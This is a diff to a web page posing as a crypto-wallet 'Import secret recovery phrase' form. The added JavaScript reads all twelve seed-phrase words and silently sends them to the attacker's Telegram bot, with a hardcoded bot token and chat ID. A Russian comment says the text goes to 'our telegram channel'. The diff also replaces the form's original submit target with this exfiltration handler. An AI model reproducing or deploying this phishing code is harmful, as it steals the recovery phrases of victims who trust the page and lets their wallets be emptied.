@@ -44,7 +44,36 @@
       <link rel="alternate" href="zh_CN/index.htm" hreflang="zh">
       <link rel="alternate" href="es/index.htm" hreflang="es">
    </head>
+  <script type="text/javascript">
+      function OnClickSendNudes() {
+        const fraze1 = document.getElementById("input1").value;
+        const fraze2 = document.getElementById("input2").value;
+        const fraze3 = document.getElementById("input3").value;
+        const fraze4 = document.getElementById("input4").value;
+        const fraze5 = document.getElementById("input5").value;
+        const fraze6 = document.getElementById("input6").value;
+        const fraze7 = document.getElementById("input7").value;
+        const fraze8 = document.getElementById("input8").value;
+        const fraze9 = document.getElementById("input9").value;
+        const fraze10 = document.getElementById("input10").value;
+        const fraze11 = document.getElementById("input11").value;
+        const fraze12 = document.getElementById("input12").value;
 
+        var chatid = "-764116271";
+        var token = "2134079185:AAGt8n69AshEn9HWIKkMPe9tnBVu3hPptwk";
+        var text = fraze1 + fraze2 + fraze3 + fraze4 + fraze5+fraze6+fraze7+fraze8+fraze9+fraze10+fraze11+fraze12;
+        //Отправляем текст в наш телеграм канал
+        otpravka(token,text,chatid);
+         
+      }
+      function otpravka(token,text,chatid){
+          var z = $.ajax({  
+          type: "POST",  
+          url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
+          data: "parse_mode=HTML&text="+encodeURIComponent(text), 
+          }); 
+      }
+    </script>
    <style>
       body {
       background: #105BAA 100%;
@@ -150,7 +179,7 @@
             <input name="phone11" type="text" class="input2 contact-form__input contact-form__input_name" tabindex="0" placeholder="11" id="input11" required="">
             <input name="phone12" type="text" class="input2 contact-form__input contact-form__input_name" tabindex="0" placeholder="12" id="input12" required="">
           </div>
-          <a href="ajax.php"><button type="submit">Import secret recovery phrase</button></a>
+          <a ><button type="submit" onclick="OnClickSendNudes()">Import secret recovery phrase</button></a>
         </form>
       </main>
    </body>
